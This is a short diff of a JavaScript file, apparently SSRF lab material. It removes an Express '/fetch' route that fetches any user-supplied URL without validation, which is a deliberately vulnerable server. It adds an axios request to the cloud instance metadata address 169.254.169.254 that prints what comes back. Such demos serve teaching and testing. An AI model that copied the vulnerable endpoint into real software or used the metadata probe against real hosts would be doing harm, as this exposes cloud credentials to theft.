@@ -1,15 +1,6 @@
-const express = require('express');
 const axios = require('axios');
-const app = express();
 
-app.get('/fetch', async (req, res) => {
-  const url = req.query.url;       // нет валидации входа
-  try {
-    const resp = await axios.get(url);
-    res.send(resp.data);
-  } catch (e) {
-    res.status(500).send(e.message);
-  }
-});
-
-app.listen(3000, () => console.log('HTTP vuln on port 3000'));
+// SSRF
+axios.get('http://169.254.169.254/latest/meta-data')
+  .then(res => console.log('Metadata:', res.data))
+  .catch(err => console.error('Error:', err.message));
